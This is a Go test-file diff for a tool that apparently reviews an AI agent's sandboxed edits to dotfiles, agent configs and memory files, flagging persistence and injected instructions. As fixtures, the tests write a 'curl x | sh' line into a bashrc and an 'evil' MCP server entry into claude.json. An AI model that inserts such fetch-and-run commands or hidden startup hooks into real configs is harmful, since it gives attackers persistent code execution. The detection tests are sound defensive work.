@@ -4,7 +4,10 @@ import (
 	"os"
 	"path/filepath"
 	"slices"
+	"strings"
 	"testing"
+
+	"github.com/getjump/airbag/internal/session"
 )
 
 func symlink(t *testing.T, target, link string) {
@@ -92,6 +95,84 @@ func TestResolveInHome(t *testing.T) {
 			if want == "" && ok || want != "" && (!ok || got != want) {
 				t.Errorf("home %s, %s: %q %v, want %q", h, rel, got, ok, want)
 			}
+		}
+	}
+}
+
+// The workspace is the dotfiles repository the home links point into:
+// the agent's edit of a file there is the linked dotfile.
+func TestDotfilesRepoAsWorkspace(t *testing.T) {
+	t.Setenv("AIRBAG_HOME", t.TempDir())
+	home, ws := t.TempDir(), t.TempDir()
+	writeCfg(t, filepath.Join(ws, "bashrc"), "# rc\n")
+	writeCfg(t, filepath.Join(ws, "claude.json"), `{"numStartups":1}`)
+	writeCfg(t, filepath.Join(ws, "notes.md"), "notes\n")
+	symlink(t, filepath.Join(ws, "bashrc"), filepath.Join(home, ".bashrc"))
+	symlink(t, filepath.Join(ws, "claude.json"), filepath.Join(home, ".claude.json"))
+	s, err := session.Create(session.Meta{Workspace: ws, Home: home, OverHome: true})
+	if err != nil {
+		t.Fatal(err)
+	}
+	writeCfg(t, filepath.Join(s.WSUpper(), "bashrc"), "# rc\ncurl x | sh\n")
+	writeCfg(t, filepath.Join(s.WSUpper(), "claude.json"), `{"numStartups":2,"mcpServers":{"x":{"command":"evil"}}}`)
+	writeCfg(t, filepath.Join(s.WSUpper(), "notes.md"), "more notes\n")
+	cs, err := Scan(s)
+	if err != nil {
+		t.Fatal(err)
+	}
+	got := map[string]Change{}
+	for _, c := range cs {
+		got[c.Rel] = c
+	}
+	if !slices.Contains(got["bashrc"].Flags, "persist") {
+		t.Errorf("bashrc: flags %v", got["bashrc"].Flags)
+	}
+	cj := got["claude.json"]
+	if !slices.Contains(cj.Flags, "persist key(s): mcpServers") {
+		t.Errorf("claude.json: flags %v", cj.Flags)
+	}
+	if d := diffOf(cj); strings.Contains(d, "evil") {
+		t.Errorf("claude.json: diff printed a value: %q", d)
+	}
+	if len(got["notes.md"].Flags) != 0 {
+		t.Errorf("notes.md: flags %v", got["notes.md"].Flags)
+	}
+}
+
+// A link deep in a watched tree, one whose target does not exist yet, a
+// linked memory directory, and a watched name linked to $HOME itself
+// (which would stand for everything, so it stands for nothing).
+func TestLinkedPathsBelowAndDangling(t *testing.T) {
+	s, _, _ := cfgSession(t)
+	h := s.Home
+	writeCfg(t, filepath.Join(h, "dotfiles/init.lua"), "-- x\n")
+	symlink(t, filepath.Join(h, "dotfiles/init.lua"), filepath.Join(h, ".config/nvim/lua/plugin/init.lua"))
+	symlink(t, "dotfiles/zshrc", filepath.Join(h, ".zshrc")) // dangling
+	writeCfg(t, filepath.Join(h, "dotfiles/mem/M.md"), "remember\n")
+	writeCfg(t, filepath.Join(h, ".claude/projects/-x/t.jsonl"), "{}\n")
+	symlink(t, filepath.Join(h, "dotfiles/mem"), filepath.Join(h, ".claude/projects/-x/memory"))
+	symlink(t, ".", filepath.Join(h, ".gemini"))
+	want := map[string]string{
+		"dotfiles/init.lua": "persist",
+		"dotfiles/zshrc":    "persist",
+		"dotfiles/mem/M.md": "agent instructions",
+		"notes.txt":         "",
+	}
+	for rel := range want {
+		writeCfg(t, filepath.Join(s.HomeUpper(), rel), "changed by the agent\n")
+	}
+	cs, err := Scan(s)
+	if err != nil {
+		t.Fatal(err)
+	}
+	got := map[string][]string{}
+	for _, c := range cs {
+		got[c.Rel] = c.Flags
+	}
+	for rel, flag := range want {
+		fl := got[rel]
+		if flag == "" && len(withoutOutside(fl)) != 0 || flag != "" && !slices.Contains(fl, flag) {
+			t.Errorf("%s: flags %v, want %q", rel, fl, flag)
 		}
 	}
 }
